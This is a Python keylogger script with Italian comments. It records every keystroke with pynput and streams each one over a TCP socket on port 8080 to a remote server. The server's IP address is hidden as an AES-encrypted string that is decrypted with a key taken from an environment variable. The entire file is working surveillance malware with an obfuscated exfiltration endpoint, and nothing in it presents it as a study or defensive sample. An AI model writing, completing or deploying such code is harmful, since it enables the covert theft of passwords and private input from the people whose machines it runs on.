from pynput import keyboard
import socket
from Crypto.Cipher import AES
import base64
import os

# Funzioni per crittografare e decrittografare usando AES in modalità CBC
def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    pad_len = data[-1]
    return data[:-pad_len]

def decrypt_aes_cbc(key, encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]  # Estrai l'IV
    encrypted_bytes = encrypted_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes))
    return decrypted_bytes.decode('utf-8')

# Indirizzo IP crittografato
encrypted_ip = "" 

def handle_keys(key: keyboard.Key):
    try:
        # Invia la chiave al server
        if key == keyboard.Key.space:
            k = " "
        elif key == keyboard.Key.enter:
            k = "\n"
        elif key == keyboard.Key.alt:
            k = "<Alt>"
        elif hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            k = "<" + str(key).split(".")[1] + ">"

        # Inviare il tasto al server con una terminazione di newline
        client_socket.sendall((k + "\n").encode('utf-8'))
    except Exception as e:
        print(f"Errore nell'invio dei dati: {e}")

def start_keylogger(server_port):
    global client_socket

    # Legge la chiave AES dalla variabile d'ambiente
    key = os.getenv('AES_KEY')

    if not key:
        raise ValueError("Chiave AES non trovata nelle variabili d'ambiente!")

    # Decrittografa l'indirizzo IP
    key_bytes = bytes.fromhex(key) 
    server_ip = decrypt_aes_cbc(key_bytes, encrypted_ip)
    print(f"IP decrittografato: {server_ip}")

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((server_ip, server_port))  # Connessione al server
        print("Connessione al server riuscita.")

        listener = keyboard.Listener(on_press=handle_keys)
        listener.start()  # Avvia il listener della tastiera
        listener.join()  # Mantiene il listener in esecuzione
    except Exception as e:
        print(f"Errore nella connessione al server: {e}")
    finally:
        client_socket.close()  # socket chiuso

if __name__ == "__main__":
    server_port = 8080  # Porta del server
    start_keylogger(server_port)
